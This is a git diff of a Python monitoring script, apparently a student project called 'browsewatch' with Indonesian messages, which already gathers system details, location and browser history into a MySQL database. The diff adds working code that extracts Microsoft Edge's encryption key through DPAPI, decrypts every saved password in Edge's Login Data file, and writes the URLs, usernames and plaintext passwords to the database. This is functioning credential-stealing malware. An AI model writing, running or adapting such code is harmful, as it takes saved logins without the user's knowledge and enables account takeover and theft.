@@ -1,5 +1,6 @@
-import os, logging, sqlite3, shutil, psutil, socket, platform, requests, pymysql
+import os, logging, sqlite3, shutil, psutil, socket, platform, requests, pymysql, base64, json, win32crypt, binascii
 from datetime import datetime
+from Crypto.Cipher import AES
 
 def get_chrome_history(limit=20):
     base_path = os.path.expanduser(r'~\AppData\Local\Google\Chrome\User Data')
@@ -101,6 +102,70 @@ def get_edge_history(limit=20):
         logging.exception(error_message)
         return []
     
+def get_edge_encryption_key():
+    local_state_path = os.path.expanduser(r'~\AppData\Local\Microsoft\Edge\User Data\Local State')
+    with open(local_state_path, 'r', encoding='utf-8') as f:
+        local_state = json.load(f)
+    encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
+    encrypted_key = encrypted_key[5:]
+    key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
+    return key
+
+def decrypt_edge_password(encrypted_password, key):
+    try:
+        if encrypted_password.startswith(b'v10'):
+            iv = encrypted_password[3:15]
+            payload = encrypted_password[15:-16]
+            tag = encrypted_password[-16:]
+            cipher = AES.new(key, AES.MODE_GCM, iv)
+            decrypted = cipher.decrypt_and_verify(payload, tag)
+            return decrypted.decode()
+        else:
+            return "[Format tidak dikenali]"
+    except Exception as e:
+        return f"[Gagal dekripsi] {e}"
+
+def get_edge_passwords():
+    passwords = []
+    info = {}
+    try:
+        key = get_edge_encryption_key()
+        db_path = os.path.expanduser(r'~\AppData\Local\Microsoft\Edge\User Data\Default\Login Data')
+        if not os.path.exists(db_path):
+            logging.error("Edge Login Data tidak ditemukan.")
+            return []
+
+        temp_path = 'temp_edge_login.db'
+        shutil.copy2(db_path, temp_path)
+
+        conn = sqlite3.connect(temp_path)
+        cursor = conn.cursor()
+        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
+        for url, username, encrypted_password in cursor.fetchall():
+            if encrypted_password:
+                decrypted = decrypt_edge_password(encrypted_password, key)
+                passwords.append({
+                    'origin_url': url,
+                    'username': username,
+                    'password': decrypted
+                })
+        conn.close()
+        os.remove(temp_path)
+        logging.info("Berhasil mengambil password dan username.")
+        return passwords
+    except Exception as e:
+        logging.error(f"Gagal mengambil password Edge: {e}")
+        return []
+
+def extract_password_fields(passwords):
+            if passwords:
+                urls = '\n'.join([p['origin_url'] for p in passwords])
+                usernames = '\n'.join([p['username'] for p in passwords])
+                values = '\n'.join([p['password'] for p in passwords])
+                return urls, usernames, values
+            else:
+                return None, None, None
+
 def get_system_info():
     info = {}
 
@@ -157,27 +222,29 @@ def get_network_activity():
         'packets_recv': net_io.packets_recv
     }
 
-def save_to_database(system_info, net_activity, chrome_history, firefox_history, edge_history):
+def escape_percent(text):
+    return text.replace('%', '%%') if text else text
+
+def save_to_database(system_info, net_activity, chrome_history, firefox_history, edge_history, url, usernames, passwords):
     try:
         conn = pymysql.connect(
             user='PBL',
-            password='history',  
-            host='192.168.10.1',
+            password='history',
+            host='localhost',
             port=3306,
-            database='browsewatch'  
+            database='browsewatch'
         )
         cur = conn.cursor()
 
         def format_history(history):
             return '\n'.join([f"[{h['timestamp']}] {h['title']} - {h['url']}" for h in history]) if history else None
 
-
         query = """
             INSERT INTO system_info (
                 username, hostname, os, local_ip, public_ip, city, region, country, 
                 latitude, longitude, bytes_sent, bytes_recv, packets_sent, packets_recv, 
-                chrome_history, firefox_history, edge_history
-            ) VALUES (%s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s)
+                chrome_history, firefox_history, edge_history, url, usernames, passwords
+            ) VALUES (%s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s)
         """
 
         cur.execute(query, (
@@ -197,13 +264,17 @@ def save_to_database(system_info, net_activity, chrome_history, firefox_history,
             net_activity['packets_recv'],
             format_history(chrome_history),
             format_history(firefox_history),
-            format_history(edge_history)
+            format_history(edge_history),
+            url,
+            usernames,
+            passwords
         ))
+
         conn.commit()
-        print("✅ Data berhasil disimpan ke database XAMPP!")
+        print("Data berhasil disimpan ke database (termasuk password)!")
         conn.close()
     except pymysql.Error as e:
-        print(f"❌ Gagal menyimpan data ke database: {e}")
+        print(f"Gagal menyimpan data ke database: {e}")
 
 if __name__ == "__main__":
     logging.basicConfig(level=logging.INFO)
@@ -215,4 +286,11 @@ if __name__ == "__main__":
     firefox_history = get_firefox_history()
     edge_history = get_edge_history()
 
-    save_to_database(system_info, net_activity, chrome_history, firefox_history, edge_history)
+    edge_passwords = get_edge_passwords()
+
+    url, usernames, passwords = extract_password_fields(edge_passwords)
+    url = escape_percent(url)
+    usernames = escape_percent(usernames)
+    passwords = escape_percent(passwords)
+
+    save_to_database(system_info, net_activity, chrome_history, firefox_history, edge_history, url, usernames, passwords)
